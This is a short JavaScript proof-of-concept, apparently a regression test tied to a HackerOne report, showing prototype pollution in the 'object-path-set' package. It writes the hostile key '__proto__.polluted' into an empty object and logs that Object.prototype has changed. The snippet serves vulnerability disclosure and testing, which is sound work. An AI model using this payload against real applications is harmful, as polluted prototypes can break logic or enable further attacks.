// //https://hackerone.com/reports/878332
// test("prototype pollution in object-path", () => {
  const setPath = require("object-path-set");

console.log({}.polluted);
  setPath({}, "__proto__.polluted", "yes");
console.log({}.polluted);
// });
